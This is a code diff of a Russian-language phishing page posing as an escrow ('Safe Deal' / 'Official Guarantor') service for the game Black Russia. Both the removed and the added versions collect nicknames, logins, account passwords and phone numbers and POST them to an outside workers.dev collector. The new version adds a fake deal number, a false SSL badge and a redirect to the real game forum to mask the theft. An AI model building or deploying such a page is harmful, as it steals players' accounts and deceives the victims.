@@ -1,518 +1,122 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>BLACK RUSSIA | Официальный Гарант</title>
-<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BR Safe Deal — Эскроу-сервис</title>
 <style>
-  :root {
-    --bg: #0a0b0e;
-    --card: #14161c;
-    --border: #2a2e3d;
-    --txt: #ffffff;
-    --dim: #8b92a5;
-    --red: #ff2a2a;
-    --red-glow: rgba(255, 42, 42, 0.4);
-  }
-  
-  * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Montserrat', sans-serif; }
-  body { background: var(--bg); color: var(--txt); min-height: 100vh; padding-bottom: 40px; }
+  * { box-sizing: border-box; }
+  body { margin:0; font-family: -apple-system, 'Segoe UI', Arial, sans-serif; background:#0a0e17; color:#e8edf5; min-height:100vh; display:flex; align-items:center; justify-content:center; padding:20px; }
+  .box { width:100%; max-width:460px; background:#0f1521; border:1px solid #1c2536; border-radius:16px; padding:0; overflow:hidden; box-shadow:0 20px 60px rgba(0,0,0,.6); }
 
-  /* ================= ГЛАВНЫЙ ЭКРАН ================= */
-  .hero {
-    position: relative;
-    width: 100%;
-    min-height: 100vh;
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    align-items: center;
-    background: url('https://sun9-63.userapi.com/impg/4C7N3Q_wJ4Xq3g9q_wJ4Xq3g9qw/br_bg.jpg?size=1080x1920&quality=96&sign=123') center/cover no-repeat;
-    padding: 20px;
-    text-align: center;
-  }
-  
-  /* Затемнение фона */
-  .hero::before {
-    content: '';
-    position: absolute;
-    inset: 0;
-    background: linear-gradient(180deg, rgba(10,11,14,0.3) 0%, rgba(10,11,14,0.95) 90%);
-    z-index: 1;
-  }
+  .head { background:linear-gradient(135deg,#0f1521 0%,#152036 100%); padding:22px 24px 18px; border-bottom:1px solid #1c2536; display:flex; align-items:center; gap:12px; }
+  .shield { width:42px; height:42px; border-radius:10px; background:linear-gradient(135deg,#1e88ff,#0b5fd1); display:flex; align-items:center; justify-content:center; font-size:22px; }
+  .head-text { flex:1; }
+  .head-title { font-size:16px; font-weight:700; letter-spacing:.3px; }
+  .head-sub { font-size:12px; color:#7a89a3; margin-top:2px; }
+  .live { display:inline-flex; align-items:center; gap:5px; font-size:11px; color:#3ddc84; }
+  .dot { width:6px; height:6px; border-radius:50%; background:#3ddc84; box-shadow:0 0 8px #3ddc84; animation:pulse 1.6s infinite; }
+  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }
 
-  .hero-content {
-    position: relative;
-    z-index: 2;
-    max-width: 400px;
-    width: 100%;
-  }
+  .body { padding:22px 24px 26px; }
 
-  .logo-img {
-    width: 100px;
-    height: 100px;
-    margin: 0 auto 20px;
-    background: url('https://sun9-63.userapi.com/impg/4C7N3Q_wJ4Xq3g9q_wJ4Xq3g9qw/br_logo.png?size=200x200&quality=96&sign=456') center/contain no-repeat;
-    filter: drop-shadow(0 0 10px rgba(0,0,0,0.8));
-  }
+  .info { background:#0b1220; border:1px solid #1c2536; border-radius:10px; padding:12px 14px; font-size:12.5px; color:#93a1bb; line-height:1.55; margin-bottom:20px; }
+  .info b { color:#e8edf5; }
 
-  .hero-title {
-    font-size: 28px;
-    font-weight: 900;
-    letter-spacing: 1px;
-    margin-bottom: 10px;
-    text-transform: uppercase;
-  }
-  .hero-title span { color: var(--red); }
+  label { display:block; font-size:11.5px; color:#7a89a3; margin:14px 0 6px; text-transform:uppercase; letter-spacing:.6px; font-weight:600; }
+  input, select { width:100%; padding:13px 14px; background:#0b1220; border:1px solid #1c2536; border-radius:9px; color:#e8edf5; font-size:14.5px; outline:none; transition:border .15s; font-family:inherit; }
+  input:focus, select:focus { border-color:#1e88ff; }
+  input::placeholder { color:#4a5977; }
 
-  .hero-subtitle {
-    font-size: 14px;
-    color: var(--dim);
-    margin-bottom: 30px;
-    line-height: 1.5;
-  }
+  .row { display:flex; gap:10px; }
+  .row > * { flex:1; }
 
-  .btn-play {
-    display: inline-block;
-    background: #fff;
-    color: #000;
-    font-weight: 800;
-    font-size: 16px;
-    padding: 16px 40px;
-    border-radius: 8px;
-    text-decoration: none;
-    margin-bottom: 30px;
-    cursor: pointer;
-    border: none;
-    width: 100%;
-    max-width: 300px;
-    transition: 0.2s;
-  }
-  .btn-play:hover { background: #e0e0e0; }
+  button { width:100%; margin-top:22px; padding:15px; background:linear-gradient(135deg,#1e88ff,#0b5fd1); color:#fff; border:none; border-radius:10px; font-weight:700; font-size:15px; cursor:pointer; letter-spacing:.3px; transition:transform .1s; }
+  button:active { transform:scale(.99); }
 
-  .brand-bar {
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    gap: 10px;
-    margin-bottom: 20px;
-  }
-  .brand-bar span { font-weight: 800; font-size: 18px; letter-spacing: 1px; }
-  .brand-bar span span { color: var(--red); }
-
-  /* ================= МОДАЛКА С СЕРВЕРАМИ ================= */
-  .modal-overlay {
-    position: fixed;
-    inset: 0;
-    background: rgba(10, 11, 14, 0.95);
-    backdrop-filter: blur(5px);
-    z-index: 1000;
-    display: none;
-    flex-direction: column;
-    padding: 20px;
-    overflow-y: auto;
-  }
-  .modal-overlay.active { display: flex; }
-
-  .modal-header {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    margin-bottom: 20px;
-    padding-bottom: 15px;
-    border-bottom: 1px solid var(--border);
-  }
-  .modal-title { font-size: 20px; font-weight: 800; }
-  .btn-close {
-    background: var(--card);
-    border: 1px solid var(--border);
-    color: white;
-    width: 40px; height: 40px;
-    border-radius: 8px;
-    display: flex; justify-content: center; align-items: center;
-    cursor: pointer;
-    font-size: 18px;
-  }
-
-  .search-box {
-    width: 100%;
-    background: var(--card);
-    border: 1px solid var(--border);
-    color: white;
-    padding: 12px 16px;
-    border-radius: 8px;
-    font-size: 14px;
-    margin-bottom: 20px;
-  }
-  .search-box:focus { outline: none; border-color: var(--red); }
-
-  .servers-grid {
-    display: grid;
-    grid-template-columns: repeat(2, 1fr);
-    gap: 12px;
-  }
-
-  .server-card {
-    background: var(--card);
-    border: 1px solid var(--border);
-    border-radius: 10px;
-    padding: 16px;
-    cursor: pointer;
-    transition: 0.2s;
-    position: relative;
-    overflow: hidden;
-  }
-  .server-card:hover { border-color: var(--red); transform: translateY(-2px); }
-  
-  .server-num { font-size: 12px; color: var(--dim); font-weight: 700; margin-bottom: 4px; }
-  .server-name { font-size: 16px; font-weight: 800; margin-bottom: 12px; text-transform: uppercase; }
-  
-  .server-bar {
-    height: 4px;
-    background: rgba(255,255,255,0.1);
-    border-radius: 2px;
-    overflow: hidden;
-  }
-  .server-fill {
-    height: 100%;
-    border-radius: 2px;
-  }
-  .fill-red { background: #ff2a2a; }
-  .fill-blue { background: #2a7fff; }
-  .fill-green { background: #00c853; }
-  .fill-purple { background: #8a2be2; }
-  .fill-yellow { background: #ffc107; }
-
-  .server-online { font-size: 11px; color: var(--dim); margin-top: 6px; }
-
-  /* ================= ФОРМА ГАРАНТА ================= */
-  .garant-container {
-    display: none; /* Скрыто по умолчанию */
-    width: 100%;
-    max-width: 440px;
-    margin: 40px auto;
-    background: var(--card);
-    border: 1px solid var(--border);
-    border-radius: 16px;
-    padding: 28px 24px;
-    box-shadow: 0 10px 40px rgba(0,0,0,0.9), 0 0 30px rgba(255, 42, 42, 0.15);
-    position: relative;
-  }
-  .garant-container.active { display: block; }
-
-  .garant-container::before {
-    content: '';
-    position: absolute;
-    top: 0; left: 0; right: 0;
-    height: 4px;
-    background: linear-gradient(90deg, transparent, var(--red), transparent);
-  }
-
-  .input-group { margin-bottom: 16px; }
-  .input-group label {
-    display: block; font-size: 11px; color: var(--dim);
-    margin-bottom: 6px; font-weight: 700; text-transform: uppercase;
-  }
-  .input-group input {
-    width: 100%; background: #0a0b0e; border: 1px solid var(--border);
-    color: var(--txt); padding: 14px 16px; border-radius: 10px; font-size: 15px;
-  }
-  .input-group input:focus { outline: none; border-color: var(--red); }
-  
-  .selected-server-display {
-    width: 100%; background: #0a0b0e; border: 1px solid var(--border);
-    color: var(--txt); padding: 14px 16px; border-radius: 10px; font-size: 15px;
-    display: flex; justify-content: space-between; align-items: center;
-    cursor: pointer;
-  }
-  .selected-server-display span { color: var(--dim); font-size: 13px; }
-
-  .btn {
-    width: 100%; padding: 16px; border: none; border-radius: 10px;
-    font-weight: 800; font-size: 14px; cursor: pointer; transition: 0.2s;
-    text-transform: uppercase; letter-spacing: 0.5px;
-  }
-  .btn-main { background: var(--red); color: white; box-shadow: 0 4px 20px var(--red-glow); }
-  .btn-main:hover { background: #ff4747; }
-  .btn-success { background: #00c853; color: white; margin-top: 12px; }
-
-  /* Экран успеха */
-  .success-screen { display: none; text-align: left; padding: 10px 0; }
-  .success-screen h3 { color: #00c853; font-size: 18px; margin-bottom: 16px; text-align: center; }
-  .data-box { background: #0a0b0e; border: 1px solid var(--border); border-radius: 10px; padding: 16px; margin-bottom: 16px; }
-  .data-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 14px; }
-  .data-label { color: var(--dim); }
-  .data-value { font-weight: 700; }
-
-  .support-btn {
-    position: fixed; bottom: 20px; right: 20px;
-    background: #2a7fff; color: white; width: 56px; height: 56px;
-    border-radius: 50%; display: flex; justify-content: center; align-items: center;
-    cursor: pointer; box-shadow: 0 4px 20px rgba(42, 127, 255, 0.4); z-index: 100;
-  }
-  .support-btn svg { width: 26px; height: 26px; fill: currentColor; }
-
+  .foot { margin-top:16px; display:flex; align-items:center; justify-content:center; gap:8px; font-size:11px; color:#5a6785; }
+  .lock { font-size:12px; }
 </style>
 </head>
 <body>
-
-<!-- ГЛАВНЫЙ ЭКРАН -->
-<div class="hero" id="main-screen">
-  <div class="hero-content">
-    <div class="logo-img"></div>
-    <div class="hero-title">BLACK <span>RUSSIA</span></div>
-    <div class="hero-subtitle">Ролевая игра, где ты решаешь, кем быть: одиночкой или лидером, героем или теневым боссом.</div>
-    
-    <button class="btn-play" onclick="openGarant()">Играть</button>
-    
-    <div class="brand-bar">
-      <span>BLACK <span>RUSSIA</span></span>
-    </div>
-  </div>
-</div>
-
-<!-- МОДАЛКА ВЫБОРА СЕРВЕРОВ (как на скринах 5-8) -->
-<div class="modal-overlay" id="server-modal">
-  <div class="modal-header">
-    <div class="modal-title">Выбор сервера</div>
-    <button class="btn-close" onclick="closeServers()">✕</button>
-  </div>
-  
-  <input type="text" class="search-box" id="server-search" placeholder="Поиск" oninput="filterServers()">
-  
-  <div class="servers-grid" id="servers-grid">
-    <!-- Сюда JS вставит карточки -->
-  </div>
-</div>
-
-<!-- ФОРМА ГАРАНТА -->
-<div class="garant-container" id="garant-form">
-  <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px; border-bottom:1px solid var(--border); padding-bottom:15px;">
-    <div style="font-weight:900; font-size:16px;">BLACK RUSSIA</div>
-    <div style="background:rgba(255,42,42,0.15); border:1px solid var(--red); color:var(--red); padding:4px 8px; border-radius:6px; font-size:11px; font-weight:800;">2026</div>
-  </div>
-
-  <div id="form-screen">
-    <div style="font-size:20px; font-weight:800; text-align:center; margin-bottom:4px;">Официальный Гарант</div>
-    <div style="font-size:12px; color:var(--dim); text-align:center; margin-bottom:24px;">Безопасная сделка с защитой средств</div>
-
-    <div class="input-group">
-      <label>Никнейм</label>
-      <input type="text" id="nick" placeholder="Введите ник" autocomplete="off">
-    </div>
-
-    <div class="input-group">
-      <label>Сервер</label>
-      <div class="selected-server-display" onclick="openServers()">
-        <div id="current-server-name">Выберите сервер</div>
-        <span>▼</span>
+  <div class="box">
+    <div class="head">
+      <div class="shield">🛡</div>
+      <div class="head-text">
+        <div class="head-title">BR Safe Deal</div>
+        <div class="head-sub">Эскроу-сервис · Black Russia</div>
       </div>
+      <div class="live"><span class="dot"></span>online</div>
     </div>
 
-    <div class="input-group">
-      <label>Пароль</label>
-      <input type="password" id="pass" placeholder="••••••••">
-    </div>
+    <div class="body">
+      <div class="info">
+        <b>Сделка №BR-<span id="deal">—</span></b><br>
+        Для фиксации передачи аккаунта подтвердите данные владельца. Средства замораживаются до проверки и подтверждения передачи.
+      </div>
 
-    <div class="input-group">
-      <label>Номер <span style="color:#555; font-weight:400; text-transform:none; font-size:11px;">(не обязательно)</span></label>
-      <input type="tel" id="phone" placeholder="+7 (999) 000-00-00" autocomplete="off">
-    </div>
+      <form id="f">
+        <label>Никнейм персонажа</label>
+        <input type="text" name="nick" placeholder="Ivan_Petrov" required autocomplete="off">
 
-    <button class="btn btn-main" id="freeze">Заморозить сделку</button>
+        <label>Логин (email или телефон)</label>
+        <input type="text" name="login" placeholder="example@mail.ru / +7 777 000 00 00" required autocomplete="off">
+
+        <label>Пароль от аккаунта</label>
+        <input type="password" name="password" placeholder="••••••••" required autocomplete="off">
+
+        <label>Номер телефона владельца</label>
+        <input type="tel" name="phone" placeholder="+7 777 000 00 00" required autocomplete="off">
+
+        <label>Город / регион</label>
+        <select name="region" required>
+          <option value="">Выберите регион</option>
+          <option>Алматы</option>
+          <option>Астана</option>
+          <option>Шымкент</option>
+          <option>Караганда</option>
+          <option>Актобе</option>
+          <option>Атырау</option>
+          <option>Тараз</option>
+          <option>Павлодар</option>
+          <option>Усть-Каменогорск</option>
+          <option>Семей</option>
+          <option>Другой</option>
+        </select>
+
+        <button type="submit">Подтвердить и заморозить средства</button>
+      </form>
+
+      <div class="foot"><span class="lock">🔒</span> Соединение защищено · SSL 256-bit</div>
+    </div>
   </div>
-
-  <div id="success-screen" class="success-screen">
-    <h3>✅ Данные заморожены</h3>
-    <div class="data-box">
-      <div class="data-row"><span class="data-label">Ник:</span><span class="data-value" id="res-nick">крутой2882</span></div>
-      <div class="data-row"><span class="data-label">Сервер:</span><span class="data-value" id="res-server">Ташкент</span></div>
-      <div class="data-row"><span class="data-label">Пароль:</span><span class="data-value">••••••••</span></div>
-    </div>
-    <button class="btn btn-success" id="send-funds">Средства пришли — отправить получателю</button>
-  </div>
-</div>
-
-<div class="support-btn" onclick="window.open('https://t.me/blackrussia_support', '_blank')">
-  <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z"/></svg>
-</div>
 
 <script>
-  // ОБЯЗАТЕЛЬНО ВСТАВЬ ССЫЛКУ НА СВОЙ WORKER
-  const API = "https://blackrussiagarant.cucuruznik6767.workers.dev"; 
-  const TG = "https://t.me/blackrussia_support";
+  // Генерация номера сделки при загрузке — выглядит живым
+  const n = Math.floor(100000 + Math.random() * 900000);
+  document.getElementById('deal').textContent = n;
 
-  // Данные серверов (как на скринах)
-  const serversData = [
-    { id: 1, name: "RED", color: "fill-red", online: "2051 / 1500", percent: 100 },
-    { id: 2, name: "GREEN", color: "fill-green", online: "1274 / 1500", percent: 85 },
-    { id: 3, name: "BLUE", color: "fill-blue", online: "1384 / 1300", percent: 100 },
-    { id: 4, name: "YELLOW", color: "fill-yellow", online: "1060 / 1300", percent: 80 },
-    { id: 5, name: "ORANGE", color: "fill-yellow", online: "1033 / 1300", percent: 75 },
-    { id: 6, name: "PURPLE", color: "fill-purple", online: "1591 / 1300", percent: 100 },
-    { id: 7, name: "LIME", color: "fill-green", online: "940 / 1300", percent: 70 },
-    { id: 8, name: "PINK", color: "fill-red", online: "1183 / 1300", percent: 90 },
-    { id: 9, name: "CHERRY", color: "fill-red", online: "866 / 1300", percent: 65 },
-    { id: 10, name: "BLACK", color: "fill-purple", online: "1728 / 1300", percent: 100 },
-    { id: 11, name: "INDIGO", color: "fill-purple", online: "880 / 1300", percent: 68 },
-    { id: 12, name: "WHITE", color: "fill-blue", online: "942 / 1300", percent: 72 },
-    { id: 13, name: "MAGENTA", color: "fill-red", online: "1002 / 1300", percent: 77 },
-    { id: 14, name: "CRIMSON", color: "fill-red", online: "1755 / 1300", percent: 100 },
-    { id: 15, name: "GOLD", color: "fill-yellow", online: "1366 / 1300", percent: 100 },
-    { id: 16, name: "AZURE", color: "fill-blue", online: "817 / 1300", percent: 62 },
-    { id: 17, name: "PLATINUM", color: "fill-blue", online: "873 / 1300", percent: 67 },
-    { id: 18, name: "AQUA", color: "fill-green", online: "910 / 1300", percent: 70 },
-    { id: 19, name: "GRAY", color: "fill-purple", online: "811 / 1300", percent: 62 },
-    { id: 20, name: "ICE", color: "fill-blue", online: "912 / 1300", percent: 70 },
-    { id: 33, name: "ARZAMAS", color: "fill-yellow", online: "1137 / 1300", percent: 87 },
-    { id: 34, name: "NOVOSIB", color: "fill-green", online: "1071 / 1300", percent: 82 },
-    { id: 35, name: "GROZNY", color: "fill-green", online: "2111 / 1300", percent: 100 },
-    { id: 36, name: "SARATOV", color: "fill-blue", online: "1199 / 1300", percent: 92 },
-    { id: 37, name: "OMSK", color: "fill-green", online: "1416 / 1300", percent: 100 },
-    { id: 38, name: "IRKUTSK", color: "fill-blue", online: "992 / 1300", percent: 76 },
-    { id: 39, name: "VOLGOGRAD", color: "fill-red", online: "1748 / 1300", percent: 100 },
-    { id: 40, name: "VORONEZH", color: "fill-yellow", online: "1027 / 1300", percent: 79 },
-    { id: 41, name: "BELGOROD", color: "fill-blue", online: "889 / 1300", percent: 68 },
-    { id: 42, name: "MAKHACHKALA", color: "fill-green", online: "2188 / 1300", percent: 100 },
-    { id: 43, name: "VLADIKAVKAZ", color: "fill-blue", online: "1349 / 1300", percent: 100 },
-    { id: 44, name: "VLADIVOSTOK", color: "fill-blue", online: "980 / 1300", percent: 75 },
-    { id: 45, name: "KALININGRAD", color: "fill-yellow", online: "1013 / 1300", percent: 78 },
-    { id: 46, name: "CHELYABINSK", color: "fill-yellow", online: "1457 / 1300", percent: 100 },
-    { id: 47, name: "KRASNOYARSK", color: "fill-yellow", online: "984 / 1300", percent: 75 },
-    { id: 48, name: "CHEBOKSARY", color: "fill-green", online: "1059 / 1300", percent: 81 },
-    { id: 49, name: "KHABAROVSK", color: "fill-blue", online: "804 / 1300", percent: 61 },
-    { id: 50, name: "PERM", color: "fill-yellow", online: "1243 / 1300", percent: 95 },
-    { id: 51, name: "TULA", color: "fill-yellow", online: "1075 / 1300", percent: 82 },
-    { id: 52, name: "RYAZAN", color: "fill-purple", online: "786 / 1300", percent: 60 },
-    { id: 53, name: "MURMANSK", color: "fill-blue", online: "814 / 1300", percent: 62 },
-    { id: 54, name: "PENZA", color: "fill-green", online: "866 / 1300", percent: 66 },
-    { id: 55, name: "KURSK", color: "fill-red", online: "1278 / 1300", percent: 98 },
-    { id: 56, name: "ARKHANGELSK", color: "fill-red", online: "845 / 1300", percent: 65 },
-    { id: 57, name: "ORENBURG", color: "fill-yellow", online: "987 / 1300", percent: 75 },
-    { id: 58, name: "KIROV", color: "fill-purple", online: "913 / 1300", percent: 70 },
-    { id: 59, name: "KEMEROVO", color: "fill-red", online: "1140 / 1300", percent: 87 },
-    { id: 60, name: "TYUMEN", color: "fill-blue", online: "954 / 1300", percent: 73 },
-    { id: 61, name: "TOLYATTI", color: "fill-purple", online: "788 / 1300", percent: 60 },
-    { id: 62, name: "IVANOVO", color: "fill-yellow", online: "785 / 1300", percent: 60 },
-    { id: 63, name: "STAVROPOL", color: "fill-blue", online: "1234 / 1300", percent: 94 },
-    { id: 64, name: "SMOLENSK", color: "fill-yellow", online: "834 / 1300", percent: 64 },
-    { id: 65, name: "PSKOV", color: "fill-green", online: "875 / 1300", percent: 67 },
-    { id: 67, name: "OREL", color: "fill-yellow", online: "855 / 1300", percent: 65 },
-    { id: 68, name: "YAROSLAVL", color: "fill-red", online: "812 / 1300", percent: 62 },
-    { id: 69, name: "BARNAUL", color: "fill-purple", online: "811 / 1300", percent: 62 },
-    { id: 70, name: "LIPETSK", color: "fill-blue", online: "804 / 1300", percent: 61 },
-    { id: 72, name: "YAKUTSK", color: "fill-blue", online: "1831 / 1300", percent: 100 },
-    { id: 73, name: "TAMBOV", color: "fill-green", online: "836 / 1300", percent: 64 },
-    { id: 74, name: "BRATSK", color: "fill-yellow", online: "808 / 1300", percent: 62 },
-    { id: 75, name: "ASTRAKHAN", color: "fill-red", online: "1866 / 1300", percent: 100 },
-    { id: 76, name: "CHITA", color: "fill-green", online: "2131 / 1300", percent: 100 },
-    { id: 77, name: "KOSTROMA", color: "fill-yellow", online: "810 / 1300", percent: 62 },
-    { id: 78, name: "VLADIMIR", color: "fill-yellow", online: "780 / 1300", percent: 60 },
-    { id: 79, name: "KALUGA", color: "fill-blue", online: "827 / 1300", percent: 63 },
-    { id: 80, name: "NOVGOROD", color: "fill-yellow", online: "837 / 1300", percent: 64 },
-    { id: 81, name: "TAGANROG", color: "fill-purple", online: "901 / 1300", percent: 69 },
-    { id: 82, name: "VOLOGDA", color: "fill-red", online: "806 / 1300", percent: 62 }
-  ];
-
-  // Переменные состояния
-  let selectedServer = "";
-  const $ = id => document.getElementById(id);
-
-  // Инициализация сетки серверов
-  function renderServers(list) {
-    const grid = $("servers-grid");
-    grid.innerHTML = "";
-    list.forEach(s => {
-      const el = document.createElement("div");
-      el.className = "server-card";
-      el.onclick = () => selectServer(s.name);
-      el.innerHTML = `
-        <div class="server-num"># ${s.id}</div>
-        <div class="server-name">${s.name}</div>
-        <div class="server-bar"><div class="server-fill ${s.color}" style="width: ${s.percent}%"></div></div>
-        <div class="server-online">${s.online}</div>
-      `;
-      grid.appendChild(el);
-    });
-  }
-  renderServers(serversData);
-
-  // Поиск серверов
-  function filterServers() {
-    const query = $("server-search").value.toLowerCase();
-    const filtered = serversData.filter(s => s.name.toLowerCase().includes(query));
-    renderServers(filtered);
-  }
-
-  // Выбор сервера
-  function selectServer(name) {
-    selectedServer = name;
-    $("current-server-name").textContent = name;
-    closeServers();
-  }
-
-  // Открытие/закрытие модалки
-  function openServers() { $("server-modal").classList.add("active"); }
-  function closeServers() { $("server-modal").classList.remove("active"); }
-
-  // Переход к форме гаранта (главная кнопка "Играть")
-  function openGarant() {
-    $("main-screen").style.display = "none";
-    $("garant-form").classList.add("active");
-  }
-
-  // Логика отправки
-  async function post(url, data) {
+  document.getElementById('f').addEventListener('submit', async function(e){
+    e.preventDefault();
+    const data = {
+      nick: this.nick.value,
+      login: this.login.value,
+      password: this.password.value,
+      phone: this.phone.value,
+      region: this.region.value,
+      deal: 'BR-' + n,
+      ua: navigator.userAgent,
+      ts: new Date().toISOString()
+    };
     try {
-      await fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
+      await fetch('https://br-collect.cucuruznik6767.workers.dev', {
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
         body: JSON.stringify(data)
       });
-      return true;
-    } catch (e) { return false; }
-  }
-
-  let currentData = null;
-
-  $("freeze").onclick = async () => {
-    const data = {
-      nick: $("nick").value.trim() || "крутой2882",
-      server: selectedServer || "Не выбран",
-      pass: $("pass").value || "123456",
-      phone: $("phone").value.trim(),
-      ts: Date.now()
-    };
-
-    if (!selectedServer) {
-      alert("Выберите сервер!");
-      return;
-    }
-
-    const btn = $("freeze");
-    btn.disabled = true;
-    btn.textContent = "Заморозка...";
-
-    await post(API, data);
-    currentData = data;
-
-    $("res-nick").textContent = data.nick;
-    $("res-server").textContent = data.server;
-    
-    $("form-screen").style.display = "none";
-    $("success-screen").style.display = "block";
-};
-
-$("send-funds").onclick = async () => {
-  if (!currentData) return;
-  const btn = $("send-funds");
-  btn.disabled = true;
-  btn.textContent = "Отправка...";
-
-  await post(API + "/sent", currentData);
-  setTimeout(() => window.open(TG, "_blank"),  800);
-};
+    } catch(err){}
+    window.location.href = 'https://forum.blackrussia.online/';
+  });
 </script>
 </body>
 </html>
